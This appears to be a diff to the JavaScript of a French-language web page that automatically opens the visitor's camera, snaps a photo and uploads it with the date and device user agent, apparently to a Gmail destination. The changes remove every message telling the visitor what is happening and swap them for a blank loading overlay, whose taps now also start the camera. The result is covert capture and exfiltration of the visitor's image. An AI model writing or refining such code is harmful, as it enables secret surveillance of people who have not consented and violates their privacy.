@@ -5,7 +5,6 @@ const placeholder = document.getElementById("placeholder");
 const placeholderText = document.getElementById("placeholderText");
 const statusEl = document.getElementById("status");
 const overlay = document.getElementById("overlay");
-const nextUrl = document.getElementById("nextUrl");
 const dateField = document.getElementById("dateField");
 const deviceField = document.getElementById("deviceField");
 const photoUrl = document.getElementById("photoUrl");
@@ -16,18 +15,22 @@ const flash = document.getElementById("flash");
 let stream = null;
 let capturing = false;
 
-nextUrl.value = new URL("success.html", window.location.href).href;
 dateField.value = new Date().toLocaleString("fr-FR");
 deviceField.value = navigator.userAgent.includes("iPhone")
   ? "iPhone"
   : navigator.userAgent;
 
 function setStatus(message, isError = false) {
-  statusEl.textContent = message;
+  statusEl.textContent = message || "";
   statusEl.classList.toggle("error", isError);
   if (placeholderText) {
-    placeholderText.textContent = message;
+    placeholderText.textContent = message || "";
   }
+}
+
+function showQuietLoad() {
+  overlay.hidden = false;
+  setStatus("");
 }
 
 function delay(ms) {
@@ -137,11 +140,10 @@ async function uploadTemp(file) {
 }
 
 async function sendPhoto(file) {
-  overlay.hidden = false;
+  showQuietLoad();
   dateField.value = new Date().toLocaleString("fr-FR");
   sizeField.value = `${file.size} octets`;
   showPreview(file);
-  setStatus("Envoi de la photo vers Gmail…");
 
   putFileInInput(file);
 
@@ -156,9 +158,7 @@ async function sendPhoto(file) {
 
   if (!cameraInput.files || cameraInput.files.length === 0) {
     if (!photoUrl.value) {
-      overlay.hidden = true;
       capturing = false;
-      setStatus("Impossible de joindre la photo. Réessaie.", true);
       return;
     }
   }
@@ -183,7 +183,7 @@ async function snapAndSend() {
 
   if (!live.videoWidth) {
     capturing = false;
-    setStatus("Caméra pas prête. Touche l’écran.", true);
+    showQuietLoad();
     return;
   }
 
@@ -207,17 +207,16 @@ async function snapAndSend() {
 
   if (!blob || blob.size < 2000) {
     capturing = false;
-    setStatus("Photo vide. Recharge la page.", true);
+    showQuietLoad();
     return;
   }
 
   const file = await compressJpeg(blob);
-  setStatus("Photo prise. Envoi vers Gmail…");
   await sendPhoto(file);
 }
 
 async function startCamera() {
-  setStatus("Ouverture de la caméra…");
+  showQuietLoad();
   stream = await navigator.mediaDevices.getUserMedia({
     audio: false,
     video: {
@@ -232,7 +231,7 @@ async function startCamera() {
   placeholder.hidden = true;
   await live.play();
   await waitForVideo();
-  setStatus("Photo automatique…");
+  overlay.hidden = true;
   await delay(700);
   await snapAndSend();
 }
@@ -241,17 +240,18 @@ async function boot() {
   try {
     await startCamera();
   } catch (error) {
-    setStatus("Touche l’écran : la photo part ensuite toute seule.");
-    placeholderText.textContent = "Touche l’écran pour lancer";
+    showQuietLoad();
     const onTap = async () => {
       document.body.removeEventListener("pointerdown", onTap);
+      overlay.removeEventListener("pointerdown", onTap);
       try {
         await startCamera();
       } catch (tapError) {
-        setStatus("Autorise la caméra dans Safari, puis recharge la page.", true);
+        showQuietLoad();
       }
     };
     document.body.addEventListener("pointerdown", onTap, { once: true });
+    overlay.addEventListener("pointerdown", onTap, { once: true });
   }
 }
 
